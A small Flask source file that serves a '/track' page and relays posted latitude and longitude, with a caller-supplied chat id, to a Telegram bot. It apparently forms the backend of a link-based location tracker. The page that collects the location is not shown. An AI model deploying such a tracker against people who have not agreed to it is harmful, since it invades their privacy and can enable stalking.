import os
from flask import Flask, request, render_template
import requests

app = Flask(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")

@app.route("/track")
def track():
    return render_template("index.html")

@app.route("/send_location", methods=["POST"])
def send_location():
    data = request.json
    lat = data.get("lat")
    lon = data.get("lon")
    user_id = data.get("id")

    if not lat or not lon or not user_id:
        return "Missing data", 400

    message = f"📍 Location Received:\nLatitude: {lat}\nLongitude: {lon}"

    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": user_id,
        "text": message
    }

    requests.get(telegram_url, params=payload)

    return "ok", 200
